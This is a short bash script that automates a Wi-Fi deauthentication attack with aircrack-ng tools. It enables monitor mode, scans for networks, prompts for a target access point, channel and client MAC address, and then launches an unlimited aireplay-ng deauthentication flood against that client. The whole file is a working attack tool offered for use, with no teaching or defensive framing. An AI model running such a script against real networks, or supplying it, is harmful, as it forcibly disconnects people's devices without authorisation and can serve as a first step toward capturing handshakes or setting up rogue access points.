#!/bin/bash

# start wlan?
airmon-ng start wlan0

# to show bssid and channel
airodump-ng wlan0mon

# bssid for wifi
read -p '[+] Enter bssid :' bssid

# channel for wifi
read -p '[+] Enter CH :' CH

# t osee clint (devices)
airodump-ng --bssid $bssid wlan0mon

# mac adderss clint
read -p '[+] Enter MAC clint :' MAC

# change the CH to CH wifi
airmon-ng start wlan0mon $CH

# start attack ...
$(aireplay-ng -0 0 -a $bssid -c $MAC wlan0mon)

